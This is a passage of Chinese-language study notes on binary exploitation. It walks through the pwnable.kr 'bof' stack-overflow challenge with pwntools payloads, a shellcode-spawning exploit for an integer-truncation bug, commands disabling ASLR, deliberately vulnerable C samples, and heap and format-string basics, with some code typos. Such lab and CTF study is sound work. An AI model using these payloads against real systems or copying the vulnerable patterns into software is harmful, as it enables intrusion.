class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data:%s\n&quot;</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    vul_func();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>fread时，指定的长度1024超过了buf尺寸。</p><p>输入数据长度可控，在input.txt中</p><p>可以精心操纵input.txt，对buf进行溢出布置shellcode、覆盖ret addr。</p><ol><li>确定栈帧布局，计算出buf到ret addr的offset【偏移地址】</li><li>先对buf填充无效数据，通过调试找出buf的首地址并覆盖ret addr。</li><li>用一段shellcode填充buf，这段shellcode会弹一个shell</li><li>IDA或者gdb找出buf距离ret addr的offset。</li><li>gdb找出buf起始的地址。</li><li>python –c ‘”A”<em>76+”B”</em>4+”\xdc\xee\xff\xbf”’ &gt; input.txt</li><li>替换”A”*76为shellcode+pads</li></ol><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p> pwnable.KR bof</p><p>【win10 虚拟机 2023.5.26-  bof】</p><p>这个是一个32位的lunix下的一个文件</p><p>可以用IDA的，但是这里我们用r2 ，复习和巩固一下基础的用法。</p><p>进去先用aaa简单分析一下啊</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526224439451.png" alt="image-20230526224439451"></p><p>这里看到了又mian函数，看看mian函数</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526224513452.png" alt="image-20230526224513452"></p><p>这里main函数call 了 这个 sym.func 这个函数</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526231828692.png" alt="image-20230526231828692"></p><p>首先看到下面这个  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp dword [arg_8h], 0xcafebabe</span><br></pre></td></tr></table></figure><p>这里就是比较的地方</p><p>起始这里用IDA中的F5看起来要直观一点【我觉得，我可能功力不够】</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526231940738.png" alt="image-20230526231940738"></p><p>这里的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( a1 == 0xCAFEBABE )</span><br></pre></td></tr></table></figure><p>也就是上面的cmp</p><p>从r2中可以看到这个get(s)的空间是：0x2c 也就是44</p><p>但是IDA中 get(s)        char s[32]; // [esp+1Ch] [ebp-2Ch] BYREF</p><p>在IDA中看到是32 ， 它和r2中的44 大小不一样，why？</p><p>很明显，这里r2中看的是汇编，但是在IDA中看到的是伪代码，伪代码中间把指针存放的大小没有考虑进去，所以我们需要看的是汇编中的代码</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526232645012.png" alt="image-20230526232645012"></p><p>这样一来就是0x2c了</p><p>然后下面要比较的字符串，占用的空间是8，所以我们需要溢出的空间是44+8=52</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">44</span>+<span class="number">8</span>) + p64(<span class="number">0x0CAFEBABE</span>)</span><br><span class="line"><span class="comment">#b&#x27;a&#x27;*(44+8) 这个地方是需要溢出的空间的大小</span></span><br><span class="line"><span class="comment">#p64(0x0CAFEBABE) 这个是那个比较函数的地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230526234150173.png" alt="image-20230526234150173"></p><p>【这里因为这个kali pwn 的环境一直搭不上…用的ubuntu】</p><p>官方payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwnable.kr&quot;,9000)</span></span><br><span class="line"><span class="comment">#print p.recvline()</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">52</span></span><br><span class="line">payload+=p64(<span class="number">0xCAFEBABE</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="整数溢出的一本原理"><a href="#整数溢出的一本原理" class="headerlink" title="整数溢出的一本原理"></a>整数溢出的一本原理</h1><h2 id="基本知识-1"><a href="#基本知识-1" class="headerlink" title="基本知识"></a>基本知识</h2><p>如果一个整数用来计算一些铭感数值，比如：缓冲区大小或数值索引就会参数一些可能的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出发生之后，很难被立即察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出</p><p><strong>出现异常的三种情况</strong></p><ol><li><strong>溢出</strong>：整数溢出需要和有符号的数才会溢出有符号数的最高位表示符号，在2个正数或者负数相加的时候，有可能改变符号位的值，产生溢出。溢出标志OF可检测有符号数的溢出</li><li><strong>回绕</strong>：无符号数0-1的时候会变成最大的数字，比如1字节的无符号数会变成255，而255+1会变成最小数0。进位标志CF可检测无符号数的回绕</li><li><strong>截断</strong>：将一个较大宽度的数存入一个宽度小的操作数中，高位就会发生截断</li></ol><h3 id="有符号整数"><a href="#有符号整数" class="headerlink" title="有符号整数"></a>有符号整数</h3><p>这一类整数用于表示正值、负值和零，范围取决于为该类型分配的位数及其表示方式（原码、反码、补码)。当有符号数的运算结果不能用结果类型表示时就会发生溢出，可以分为上溢出和下溢出两种。</p><ul><li><strong>上溢出</strong>：往上的溢出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int i = 2147483647;</span><br><span class="line">i++;</span><br><span class="line"></span><br><span class="line">//i=-2147483648</span><br></pre></td></tr></table></figure><ul><li><strong>下溢出</strong>：往下的溢出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int i=-2147483648；</span><br><span class="line">i--;</span><br><span class="line"></span><br><span class="line">//i = 2147483647;</span><br></pre></td></tr></table></figure><h3 id="整数提升"><a href="#整数提升" class="headerlink" title="整数提升"></a>整数提升</h3><p>是指：当计算表达式中包含了不同宽度的操作数的时，较小宽度的操作数会被提升到和较大操作数一样的宽度，然后再进行计算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> l;</span><br><span class="line">    <span class="type">short</span> s;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    l = <span class="number">0xabcddcba</span>;</span><br><span class="line">    s = l;</span><br><span class="line">    c = l;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;宽度溢出\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;l = 0x%x (%d bits)\n&quot;</span>, l, <span class="keyword">sizeof</span>(l) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s = 0x%x (%d bits)\n&quot;</span>, s, <span class="keyword">sizeof</span>(s) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = 0x%x (%d bits)\n&quot;</span>, c, <span class="keyword">sizeof</span>(c) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整型提升\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s + c = 0x%x (%d bits)\n&quot;</span>, s+c, <span class="keyword">sizeof</span>(s+c) * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="memcpy-函数"><a href="#memcpy-函数" class="headerlink" title="memcpy()函数"></a>memcpy()函数</h3><p>将src所指向的字符串中以src地址开始前n个字节复制到dest所指向的数组中，并且返回dest</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">viod *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><h3 id="strncpy-函数"><a href="#strncpy-函数" class="headerlink" title="strncpy()函数"></a>strncpy()函数</h3><p>从源src所指的内存地址的起始位置开始复制n个字节到目标dest所指的内存地址的起始位置中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest , <span class="type">const</span> <span class="type">char</span> *src , <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><h3 id="整数转换"><a href="#整数转换" class="headerlink" title="整数转换"></a>整数转换</h3><p>如果攻击者给len赋予一个负数，则可以绕过if语句的检测，执行到memcpy()的时候，由于第三个参数是size_t类型，负数len会被转化为无符号整型，于是就变成了一个很大的正数。从而复制大量的内容到buf中，引发缓冲区溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">80</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> len = read_int_from_network();</span><br><span class="line">    <span class="type">char</span> *p = read_string_from_network();</span><br><span class="line">    <span class="keyword">if</span>(len&gt;<span class="number">80</span>)&#123;</span><br><span class="line">        error(<span class="string">&quot;length too large:bad god, no cookie for you&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,p,len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="回绕和溢出"><a href="#回绕和溢出" class="headerlink" title="回绕和溢出"></a>回绕和溢出</h3><p>当len过大的时候，len+5有可能发生回绕</p><p>比如，在x86-32上，如果len=0xFFFFFFFF，则len+5=0x00000004，这时malloc()只分配了4字节内存，然后在里面写入大量数据，就发生了缓冲区溢出。（如果将len声明为有符号int类型，len+5可能发生溢出）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">size_t</span> len;<span class="comment">//int len</span></span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    len = read_int_from_network();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(len+<span class="number">5</span>);</span><br><span class="line">    read(fd,buf,len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是因为malloc 这个函数和前面的int len 发生了思想上的错误所导致的错误。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527011321973.png" alt="image-20230527011321973"></p><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>这个例子接受两个字符串类型的参数并计算总长度，程序分配足够的内存来存储拼接后的字符串。首先将第一个字符串复制到缓冲区，然后将第二个字符串连接到尾部。此时如果攻击者提供的两个字符串总长度无法用total表示，就会发生截断，从而导致后面的缓冲区溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> total;</span><br><span class="line">    total = <span class="built_in">strlen</span>(argv[<span class="number">1</span>])+<span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(total);</span><br><span class="line">    strcopy(buf,argv[<span class="number">1</span>]);</span><br><span class="line">    strcopy(buf,argv[<span class="number">2</span>]);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">validate_passwd</span><span class="params">(<span class="type">char</span> *passwd)</span> &#123;</span><br><span class="line"><span class="type">char</span> passwd_buf[<span class="number">11</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line"><span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;good!\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(passwd_buf, passwd);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bad!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">validate_passwd(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这个程序，strlen()返回类型是size_t，却被储存在无符号字符串类型中，任意超过无符号字符串最大上上线值【256】的数据都会导致截断异常。当密码长度是261的时候，截断后的值就变成5，成功绕过了if判断，导致栈溢出。获得shell</p><p>解：</p><p>首先关闭这个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -z execstack a.c</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230527012540397.png" alt="image-20230527012540397"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ret_addr = <span class="number">0xffffcc68</span> <span class="comment"># ebp = 0xffffcc58</span></span><br><span class="line">shellcode = shellcraft.i386.sh()</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span></span><br><span class="line">payload += p32(ret_addr)</span><br><span class="line">payload += <span class="string">&quot;\x90&quot;</span> * <span class="number">20</span></span><br><span class="line">payload += asm(shellcode)</span><br><span class="line">payload += <span class="string">&quot;C&quot;</span> * <span class="number">169</span> <span class="comment"># 24 + 4 + 20 + 44 + 169 = 261</span></span><br></pre></td></tr></table></figure><p>根本没明白….这个shellcode 是咋写出来的。我是直无语了</p><h1 id="堆溢出漏洞基本原理"><a href="#堆溢出漏洞基本原理" class="headerlink" title="堆溢出漏洞基本原理"></a>堆溢出漏洞基本原理</h1><p>​    堆（chunk)内存是一种允许程序在运行过程中动态分配和使用的内存区城。相比于栈内存和全局内存，堆内存<strong>没有</strong>固定的生命周期和围定的内存区域，程序可以动态地申请和释放不同大小的内在。被分配后，如果没有进行明确的释放操作，该堆内存区域都是一直有效的。</p><p>堆是程序虚拟内存中由低地址向高地址增长的线性区域。一般只有当用户向操作系统申请内存时，这片区域才会被内核分配出来，并且出于效率和页对齐的考虑，通常会分配相当大的连续内存。程序再次申请时便会从这片内存中分配，直到堆空间不能满足时才会再次增长。堆的位置一般在BSS段高地址处。</p><p>为了进行高效的堆内存分配、回收和管理，Glibc实现了Ptmalloc2的 堆管理器。主要介绍Ptmalloc2堆管理器缺陷的分析和利用。只介绍Glibc 2.25版本最基本的结构和概念，以及2.26版本的加入新特性，具体堆管理器的实现请读者根据Ptmalloc2源代码进行深入了解。</p><h2 id="堆概述"><a href="#堆概述" class="headerlink" title="堆概述"></a>堆概述</h2><p>堆一直以来都是pwn的一个分水岭，你在CTF走多远就取决于你堆玩的有多6</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">heap #查看堆块</span><br><span class="line">bin #查看bin区块</span><br><span class="line">p &amp;__free_hook #查看某个函数的真实地址</span><br><span class="line">p *__free_hook #查看某个函数的指向</span><br><span class="line">x/xxgx 0xxxx #查看某个地址的内存</span><br><span class="line">vmmap</span><br></pre></td></tr></table></figure><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>其实堆你就可以看成一个结构体数组，然后数组里每个元素都会开辟一块内存来存储数据</p><p>那么这块用来存储数据的内存就是堆。</p><p>结构体数组在BSS段上，其内容就是堆的地址，也就是堆的指针。</p><p>总的来说，就是划分为了2部分，管理区块和数据存放区块，存放区块就是堆，管理区块可以对堆增删改查</p><h2 id="题型划分"><a href="#题型划分" class="headerlink" title="题型划分"></a>题型划分</h2><p>off by one</p><p>off by null</p><p>堆溢出</p><p>UAF</p><p>double free</p><h2 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h2><p>其实无论什么题型，最后都是为了在管理区块上有多个指针指向同一个堆，最后的效果都是如此的</p><h2 id="堆大小的计算方法"><a href="#堆大小的计算方法" class="headerlink" title="堆大小的计算方法"></a>堆大小的计算方法</h2><p>min：最小值为0x20 你申请的再小都好 他都会划分为0x20</p><p>堆块大小的计算方式:你申请一个0x20的你会得到0x30 0x28的也是会得到0x30 他会自动进1位</p><h2 id="bin的划分"><a href="#bin的划分" class="headerlink" title="bin的划分"></a>bin的划分</h2><p>bin管理区块是管理被free后的堆的，是可以被我们利用的</p><p>tcache bins: 0-0x420大小 被free后的堆会进入这 填满7个后就不会再往里面填 寻址方式靠fd指针</p><p>large bin: 寻址方式靠fd bk指针 双向链表</p><p>small bin :寻址方式靠fd bk指针 双向链表</p><p>fast bin: 0~0x90寻址方式靠fd 指针 单链表</p><p>unsorted bin:寻址方式靠fd bk指针 双向链表</p><h2 id="从bin取堆的优先度"><a href="#从bin取堆的优先度" class="headerlink" title="从bin取堆的优先度"></a>从bin取堆的优先度</h2><p>tcache机制在Ubuntu18及以上才有，如果tcache里面有则优先从tcache里面取，如果没有就去对应大小的bin里面取，还是没有才去unsorted bin里面切割。</p><h2 id="堆的字段讲解"><a href="#堆的字段讲解" class="headerlink" title="堆的字段讲解"></a>堆的字段讲解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x602000</span><br><span class="line">0x602000: prev_size size</span><br><span class="line">0x602010: fd bk</span><br><span class="line">0x602020: fd_next bk_next</span><br><span class="line">0x602030: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>在堆没被释放的时候堆的有效字段为size，size以下都是我们的content也就是我们可以写入的内容，大小根据程序来申请的size来决定</p><p>我们前面提到了一点堆的size的问题，为什么是取16的整数倍是因为哪怕最小的一个chunk他需要的字段都要包含</p><p>prev_size size</p><p>fd bk</p><p>fd_next bk_next是large bin 和small bin 才有的</p><h2 id="size字段讲解"><a href="#size字段讲解" class="headerlink" title="size字段讲解"></a>size字段讲解</h2><p>关于size字段他又存在一个insure标志位我们申请的正常的堆在gdb看见的size字段结尾都是1例如0x91</p><p>这个insure位是用来记录这个堆前面的堆是否被释放，这里简单提下off by null的利用假设我的堆本来是</p><p>0x111大小的然后前面的堆是没被释放的，但是因为这个漏洞的关系导致了我0x111大小被修改为0x100</p><p>那么此时程序就误认为我们前面的堆被释放了，我们再去释放这个0x100的堆，前面的堆就会因为合并规则</p><p>和这个堆一起被丢进bins里面，但是我们的管理区块是没有删除他们的地址的，所以当我们再去申请的时候</p><p>就会造成管理区块有多个地址指向同一个堆可以造成堆复用进而导致getshell。</p><h2 id="fd-bk-prev-size的讲解"><a href="#fd-bk-prev-size的讲解" class="headerlink" title="fd bk prev_size的讲解"></a>fd bk prev_size的讲解</h2><p>prev_size记录的是前一个堆块的大小 是只有当前一个堆块被free的时候才会出现的，这个的初衷是用来防止用户串改被释放后的堆块的大小的但是我们依然各种漏洞绕过。</p><p>fd，bk指针是当chunk进入到bin里面会被启用的字段，此时他们就是有效的指针，我们可以修改指针达到任意地址申请的效果</p><h1 id="格式化字符串漏洞利用"><a href="#格式化字符串漏洞利用" class="headerlink" title="格式化字符串漏洞利用"></a>格式化字符串漏洞利用</h1><h2 id="格式化字符串漏洞基本原理"><a href="#格式化字符串漏洞基本原理" class="headerlink" title="格式化字符串漏洞基本原理"></a>格式化字符串漏洞基本原理</h2><p>C语言中常用的格式化输出函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fprintf</span><span class="params">(FILE *stream, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sprintf</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">snprintf</span><span class="params">(<span class="type">char</span>)</span></span><br></pre></td></tr></table></figure><p>两种用法类似，在C语言种，printf的常规用法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%S\n&quot;</span>,<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number:%d\n&quot;</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>其中，函数第一个参数带有%d、%s等占位符的字符串被称为格式化字符串，占位符用于指明输出的参数值如何格式化。</p><p>占位符的语法为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flag][field width][.precision][length]type</span><br></pre></td></tr></table></figure><p>parameter可以忽略或者为**n$**，n表示此占位符是传入的第几个参数。</p><p>flags可为0个或多个，主要包括：</p><ul><li>+—总是表示有符号数值的’+’或’-‘，默认忽略正数的符号，仅适用于数值类型。</li><li>空格—有符号数的输出如果没有正负号或者输出0个字符，则以1个空格作为前缀。</li><li>-—左对齐，默认是右对齐。</li><li>＃—对于’g’与’G’，不删除尾部0以表示精度对于’f’、’F’、’e’、’E’、’g’、’G’，总是输出小数点；对于’o’、’x’、’X’，在非0数值前分别输出前缀0、0x和0X，表示数制。</li><li>0—在宽度选项前，表示用0填充</li></ul><p>field width给出显示数值的最小宽度，用于输出时填充固定宽度。实际输出字符的个数不足域宽时，根据左对齐或右对齐进行填充，负号解释为左对齐标志。如果域宽设置为“*”，则由对应的函数参数的值为当前域宽。</p><p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串，根据其来解析之后的参数</strong></p><p>常见的有格式化字符串函数有：</p><ul><li>输入：<ul><li>scanf</li></ul></li><li>输出<ul><li><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528133013753.png" alt="image-20230528133013753"></li></ul></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h3><p>只需要输入很多个%s就可</p><p>%s%s%s%s%s%s%s%s%s%s%s%s%s%s</p><p>这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。</p><h3 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528134648560.png" alt="image-20230528134648560"></p><p>发现当输入%08x.%08x.%08x的时候就不对咯</p><p>gdb调试，下断点在printf处，然后运行输入：%08x.%08x.%08x</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528135837332.png" alt="image-20230528135837332"></p><p>可以看出，此时此时已经进入了 printf 函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序，断在了第二个printf处：</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528135933469.png" alt="image-20230528135933469"></p><p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd94 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。</p><p><img src="https://cdn.staticaly.com/gh/re-again/pic_bed@main/md/image-20230528135957703.png" 